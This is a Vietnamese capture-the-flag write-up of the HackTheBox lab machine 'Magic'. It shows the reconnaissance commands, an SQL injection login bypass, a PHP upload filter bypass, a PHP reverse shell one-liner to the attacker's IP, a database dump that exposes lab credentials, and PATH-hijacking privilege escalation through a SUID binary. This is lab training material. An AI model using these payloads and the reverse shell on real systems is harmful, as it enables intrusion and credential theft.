## 0. Mở đầu

Magic là một machine Linux  ra mắt từ 2/5/2020 (được 36 ngày). Machine có IP 10.10.10.185, được đánh giá ở mức Medium.

![](https://images.viblo.asia/374e82c5-7fe6-4d21-b213-5dd5f9859613.png)

Về matrix rate, nó khá chung chung, 

![](https://images.viblo.asia/a587f29e-97f7-49fe-926b-9e76f70368f7.png)

Machine được rate khá cao (4,6/5) nên hi vọng sẽ hay và học được nhiều cái mới.


## 1.Write-up

##### Write-up vừa làm vừa viết nhưng lần này sẽ rút gọn hơn!

### 1.1 User Flag

Scan Nmap, command cũ:

`sudo nmap -v -sS -A -Pn -T5 -p- -oN magic.txt 10.10.10.185`

Có 2 port được mở là 22 và 80, nghe hơi hướng có vẻ phải chuyển hướng tấn công, scan bằng Nmap tiếp cho chắc rồi...đi làm việc khác, do Matrix-rate  có hướng CVE nhẹ nên thêm --script vào để xem có cái RCE nào không:

`sudo nmap -sS -sV --script=default,vuln -p 80,22 -T5 -oN nmap_final.txt 10.10.10.185`

Đi tìm các route/endpoint của machine:

`dirsearch -u http://10.10.10.185/ -t 20 -e html,php,txt`

Hàng về:


```
/login.php
/index.php/login/
/upload.php  ->  login.php (yêu cầu login trước)
```

Với **dirsearch** mình chỉ dùng mặc định, vì cảm thấy brute-force với **wordlist ngoài** cùng dirsearch là không ăn thua.

![](https://images.viblo.asia/6fe9dd3a-4dc1-4aaf-9daa-e36d0fb6b044.png)

Sau đó mình có thử thêm [gobuster](https://github.com/OJ/gobuster) để tìm các path và endpoit cùng các wordlist lớn nhưng ko ra thêm gì. Giới thiệu về Gobuster tại [đây](https://kgcg.wordpress.com/2020/05/19/do-tham-website-web-reconnaissance-tools-1-gobuster/).

Quay về với những gì tìm được thì có 1 form login tại http://10.10.10.185/login.php

Thử 1 số payload đơn giản, và... siêu đơn giản `' or 1=1;--`

Vậy là login thành công, được redirect sang `http://10.10.10.185/upload.php`

![](https://images.viblo.asia/f456df2f-966f-42b9-9f3d-bf7e486b0fd6.png)

Test nhẹ cái:

![](https://images.viblo.asia/e398e161-09f8-4554-802a-7b0cba85ea03.png)

Có vẻ đã đến lúc dùng Burpsuite :v 

Sau khi test 1 hồi, thì mình nhận ra phần Upload có check kỹ tên File và file content : Upload một image đúng format, xóa nội dung và thay bằng code PHP sẽ nhận response như sau:

![](https://images.viblo.asia/e7f2d26e-5c47-4565-8db7-241a143ca4ae.png)

Với tên sai thì tương tự như pop-up phía trên. Chúng ta chỉ có thể upload file dạng này:

![](https://images.viblo.asia/d435f4ec-cda3-4085-9097-2e9fcf96519f.png)

Nhưng với file content, nó chỉ check header, và điều này không khó để bypass:

Upload một file đúng quy định, xóa nội dung thay bằng code php và để lại header là đủ:

![](https://images.viblo.asia/501e3f42-33a0-4c65-a960-3afac5ec738d.png)

Tại đây chúng ta đã có thể execute lệnh với quyền www-data:

![](https://images.viblo.asia/c2395b82-ed44-4b55-9ff1-a307e33d2546.png)

Chạy reverse shell về máy cho khỏe:

`php -r '$sock=fsockopen("10.10.14.40",3333);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

Thành quả:

![](https://images.viblo.asia/02bb006d-460b-4c8c-a72d-af1f3a7fc800.png)

Để cho xịn hơn:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Ý tưởng lớn...gặp nhau, sau khi có được reverse shell, mình vào **/tmp/** thì đã thấy [PEASS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) ở đó (của ai đó) từ bao giờ, thôi thì có duyên thì mình chạy luôn vậy :v Thực tế tiện thì...chạy chứ dump ra nhiều quá cũng ko tìm thấy gì...

Machine có username tên **theseus**, trở về với **/var/www/Magic/**  chúng ta có file db.php5, nội dung như sau:

![](https://images.viblo.asia/2299e5ad-71c2-4f48-bb1f-6cf9858b0c71.png)

Dùng thử để SSH tới thì đương nhiên là không được. Connect tới database cũng không được do chưa có mysql-client và mariadb-client:

![](https://images.viblo.asia/062e5441-d031-4b30-99f9-0f0bc54537ed.png)

Nhưng để backup database bằng mysqldump thì được, tìm 1 lúc ra cú pháp đúng tại [đây](https://www.tecmint.com/mysql-backup-and-restore-commands-for-database-administration/)

![](https://images.viblo.asia/f5dfc7a7-1af6-43d2-8597-cdbcba0de438.png)


`mysqldump -u theseus -piamkingtheseus --all-databases`

Và có credentials tại giá trị insert vào table **login**:

![](https://images.viblo.asia/c48efae7-224e-4666-91f8-8b938c7dcd20.png)

`Th3s3usW4sK1ng`

Sử dụng nó để switch account thì ăn ngay và get flag:

![](https://images.viblo.asia/4ab46494-9e4e-4d5f-9671-f0fbdd9bec4a.png)

### 1.2 Root  Flag

Gõ `sudo -l` thì user **theseus** không có Sudo Rights, chuyển sang tìm SUID.

Về Sudo Rights các bạn đọc bài tại [đây](https://kgcg.wordpress.com/2020/01/13/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights/) , về SUID thì tại [đây](https://kgcg.wordpress.com/2020/02/04/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit/).

Mình thường tìm 2 phương pháp này trước vì nó phổ biến, hay gặp và mình làm quen nhất:

`find / -perm -u=s -type f 2>/dev/null`


Những binary "lạ" được gắn SUID:

![](https://images.viblo.asia/1d009a90-9ecc-45f3-a964-755e9ad90676.png)

Cố đọc từng binary bằng lệnh `strings /path/to/binary`

Tại **/bin/sysinfo** dùng tới 3 lệnh sau:

![](https://images.viblo.asia/4d9b6cbb-416f-4dad-9ee3-f66686b9cd53.png)

Để thân thuộc mình sẽ dùng **cat** để leo quyền.

Về ý tưởng leo quyền bằng cách này, các bạn đọc tại [đây](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

Ý tưởng sẽ là: Tạo 1 file tên cat, content của nó do chúng ta quyết định, gán nó vào PATH variable.
Khi binary có SUID được chạy (sysinfo), thì **cat** cũng được chạy với quyền root (do SUID này do Root gắn), khi đó thì lấy cờ easy.

Tạo một file tên **cat**, content của nó dùng để đọc flag:

![](https://images.viblo.asia/084a386e-aa45-42a2-9844-e46b10eb144f.png)

Sau đó kéo về **/tmp/** của machine,  Command leo quyền như sau:

```
cd /tmp
chmod 777 cat
echo $PATH
export PATH=/tmp:$PATH
```

Khi đó nếu bạn chạy **cat --h** thì câu chuyện sẽ như thế này:

![](https://images.viblo.asia/c6508d9f-92c0-43d2-82c6-b734795deafc.png)

Nhưng chạy thông qua **sysinfo** thì được do nó có SUID, khi Path variable đã được gán, command chỉ là **sysinfo**, và kết quả:

![](https://images.viblo.asia/7ab60cfc-6a28-4c97-8ff0-5a5afc675c90.png)

## 2. Kết luận

Machine khá cơ bản và dễ tiếp cận. Không có nhiều "lỗ thỏ".